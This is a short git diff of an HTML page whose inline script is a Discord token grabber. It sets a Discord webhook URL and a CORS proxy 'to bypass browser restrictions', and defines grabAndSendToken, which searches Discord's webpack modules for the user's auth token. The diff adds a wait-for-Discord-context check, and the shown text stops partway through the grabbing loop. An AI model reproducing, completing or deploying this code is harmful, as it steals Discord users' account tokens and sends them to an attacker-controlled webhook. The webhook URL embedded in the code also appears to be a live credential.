@@ -7,16 +7,19 @@
 </head>
 <body>
     <script>
-        // Webhook URL (Verified Correct)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
-        
-        // CORS Proxy to bypass browser restrictions
         const PROXY_URL = "https://corsproxy.io/?";
 
         async function grabAndSendToken() {
             let token = null;
             
             try {
+                // Check if we are in Discord context
+                if (typeof webpackChunkdiscord_app === 'undefined') {
+                    console.log("⏳ Waiting for Discord context...");
+                    return; // Wait for next interval
+                }
+
                 // Token Grabbing Logic
                 for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
                     try {
